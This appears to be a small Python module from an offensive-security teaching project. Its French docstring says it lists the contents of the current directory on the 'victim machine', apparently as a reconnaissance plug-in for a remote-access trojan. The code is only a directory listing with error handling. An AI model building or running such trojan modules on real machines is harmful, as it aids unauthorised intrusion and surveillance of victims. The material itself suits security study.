import os

def run(**args):
    """
    Liste le contenu du répertoire courant sur la machine victime.
    Retourne une chaîne avec tous les fichiers/dossiers.
    """
    print("[*] Dans le module dirlister.")
    
    try:
        files = os.listdir(".")  # Liste tout dans le répertoire courant
        if not files:
            result = "[+] Répertoire vide."
        else:
            result = "\n".join(files)  # Un fichier par ligne
            print(f"[+] {len(files)} éléments trouvés :")
            print(result)
        return result
        
    except PermissionError:
        error = "[-] Permission refusée pour lire le répertoire."
        print(error)
        return error
    except Exception as e:
        error = f"[-] Erreur : {str(e)}"
        print(error)
        return error